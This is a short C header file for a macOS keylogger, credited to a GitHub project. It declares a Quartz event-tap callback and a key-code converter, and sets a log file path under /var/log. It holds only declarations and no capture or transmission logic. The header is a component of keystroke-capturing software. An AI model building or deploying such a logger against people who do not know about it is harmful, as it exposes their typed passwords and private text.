//https://github.com/caseyscarborough/keylogger
#ifndef __KEYLOGGER_H__
#define __KEYLOGGER_H__

#include <stdio.h>
#include <time.h>
#include <string.h>
#include <ApplicationServices/ApplicationServices.h>
#include <Carbon/Carbon.h>
//
#include <time.h>
#include <sys/time.h>
#include <stdio.h>
//
#ifdef __MACH__
#include <mach/clock.h>
#include <mach/mach.h>
#endif


// https://developer.apple.com/library/mac/documentation/Carbon/Reference/QuartzEventServicesRef/Reference/reference.html

FILE *logfile = NULL;
const char *logfileLocation = "/var/log/mouselogger.log";

CGEventRef CGEventCallback(CGEventTapProxy, CGEventType, CGEventRef, void*);
const char *convertKeyCode(int);

//void print_current_time_with_ms();

#endif
